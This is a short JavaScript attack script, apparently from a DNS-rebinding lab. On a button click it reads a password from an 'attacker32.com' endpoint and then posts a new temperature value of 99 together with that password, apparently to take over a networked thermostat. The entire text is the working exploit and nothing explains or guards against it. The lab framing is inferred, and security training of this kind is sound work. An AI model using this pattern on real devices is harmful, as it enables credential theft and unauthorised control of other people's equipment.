let url_prefix = 'http://www.attacker32.com:8080'

function updateTemperature() {
  $.get(url_prefix + '/password', function(data) {
	$.post(url_prefix + '/temperature?value=99'  
               + '&password='+ data.password, 
               function(data) {
                  console.debug('Got a response from the server!');
               });
  });
}

button = document.getElementById("change");
button.addEventListener("click", updateTemperature);